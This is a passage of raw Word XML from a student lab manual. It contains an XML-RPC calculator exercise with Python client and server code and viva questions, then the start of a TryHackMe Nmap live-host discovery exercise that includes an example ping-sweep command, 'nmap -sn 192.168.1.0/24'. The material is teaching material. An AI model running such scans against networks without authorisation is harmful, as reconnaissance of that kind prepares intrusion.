          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SIMPLE CALCULATOR USING XMLRPC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197E571D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1EE0BC5E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To develop a simple calculator using xmlrpc in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA72AE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Introduction: XML-RPC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E25C811" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>XML-RPC is a protocol that uses XML to encode remote procedure calls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A792072" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>(RPC) and HTTP as a transport mechanism, allowing a client to call functions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DEA150" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>on a remote server over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDF431E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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661EB38F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42DB50BD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Import xmlrpc.client and create a ServerProxy for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B529B0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>http://localhost:8000/.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0D4CA2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Loop a fixed number of times (e.g., 5).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3841BAE5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Prompt the user to input two numbers (a and b).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CABA713" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Call server functions (add, sub, mul, div, mod) via the proxy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70357378" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Receive results from the server for each operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9BAE31" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. Print the results to the user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6876615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20815B1E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Import SimpleXMLRPCServer from xmlrpc.server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9141D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Define arithmetic functions: add, sub, mul, div, mod.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689710C5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Create an XMLRPCServer object bound to localhost on port 8000.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066B3C99" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Register each function with the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0063B1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Print a message indicating the server is listening.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FD5A4A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. Start the server using serve_forever() to handle incoming client</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7D8C51" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7CEB8B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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6537D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021B449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xmlrpc.client</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B230B7A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7C311F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proxy= xmlrpc.client.ServerProxy('http://localhost:8000/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49754EF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for i in range(5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34628E34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a=int(input("Enter a number:"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F63722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b=int(input("Enter b number:"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57ADEFD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print("addition of given number is %d "%((proxy.add(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D5DDF2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print("sub of given number is %d "%((proxy.sub(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B06F86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print("mul of given number is %d "%((proxy.mul(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB31CA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print("div of given number is %d "%((proxy.div(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5F1C9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print("mod of given number is %d "% ((proxy.mod(a,b))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D9AD1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26D2478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from xmlrpc.server import SimpleXMLRPCServer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0E459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add(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A911D0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return a+b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C14828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sub(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DFF97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return a-b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1072193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mul(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043DCAF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return a*b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A02EDC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div(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0932928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return a/b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742D02E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mod(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD4AC3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return a%b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E057A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server = SimpleXMLRPCServer(("localhost", 8000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53909EF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print("Listening on port 8000...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2FC4D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server.register_function(add, "add")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399E8AA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server.register_function(sub, "sub")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1238E9F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server.register_function(mul, "mul")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C74EB19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server.register_function(div, "div")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6BD84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server.register_function(mod, "mod")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7055E0F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server.serve_forever()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A4E350" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B13DB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2007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00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82)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B998486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7B7DE9DC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="28818D64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0D1A018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39B98DD5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus a simple calculator was developed using xmlrpc in python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E82EC8A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB91A8A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3BE0A6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is XML-RPC?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632602D7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447D755" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>XML-RPC (XML Remote Procedure Call) is a protocol that allows a program</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131CC0EE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>to call functions on another computer using XML for data exchange over a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51223743" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AEE626" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is the client-server model in XML-RPC?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C00D5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5ACD35D2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>In the client-server model, the client sends a request to perform an operation,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D96AA5C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and the server processes the request and returns the result.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68124291" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Which Python modules are used for XML-RPC programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F90A8E4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BAC021B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Python provides the following modules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D9800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3116B8E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>xmlrpc.server for creating the server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E57E65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D2CD447" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>xmlrpc.client for creating the client</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD86982" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Why is XML used in XML-RPC?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28545F2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7D3BE47" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>XML is used because it is a standard, platform-independent format for</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2137727A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>exchanging structured data between systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672F6D23" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is a remote procedure call (RPC)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217AC81C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7E5B9F54" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A remote procedure call is a technique that allows a program to execute a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFC4C75" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>function or method on another computer as if it were a local function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390DF068" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CC9FB1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No: 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5317484E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NMAP LIVE HOST DISCOVERY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3DAD9B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3C39E1E9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To use Nmap to discover live hosts using ARP scan, ICMP scan, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139C6FE1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP/UDP ping scan in TryHackMe platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737CC21C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Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142F8EEE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Nmap is a network scanning tool that finds hosts, open ports, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8B035E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130D353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Task 1: Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBF79C9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B0090E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Task 2: Subnetworks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745853A5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8DE0EA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Task 3: Enumerating Targets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFA7A8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Task 4: Discovering Live Hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003A6655" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B747895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Task 5: Nmap Host Discovery Using ARP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E42E4B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Task 7: Nmap Host Discovery Using TCP and UDP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074C2622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Task 8: Using Reverse-DNS Lookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5F92F0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6094B795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Summary:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4453CA63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5D880A16" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus Nmap was used to discover live hosts using ARP scan, ICMP scan,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F7CAD4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and TCP/UDP ping scan in TryHackMe platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2D02E1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D43FBC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019E12E0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is Nmap?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2846CD5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3F40D575" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Nmap (Network Mapper) is an open-source tool used for network discovery,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3549ADBA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>host identification, and security auditing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669A8DFD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is live host discovery in Nmap?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5245FF72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62659EC4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Live host discovery is the process of identifying active devices (hosts) on a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F88A3AF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network without performing a complete port scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FC72A6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Which Nmap option is used only for host discovery?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC730B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26A55B63" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The -sn option is used for host discovery without scanning ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AFBC8F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E17A63" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>nmap -sn 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452109E5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What protocols are commonly used by Nmap for host discovery?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F857F8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5F7AB9CE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Nmap commonly uses:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02370A8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49B85BB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ICMP Echo Requests (Ping)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D66229D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424ABD0C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ARP Requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4843514C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992A594" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP SYN Ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E6F7D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CBF6546" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP ACK Ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359D0AAB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4AF0C99" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
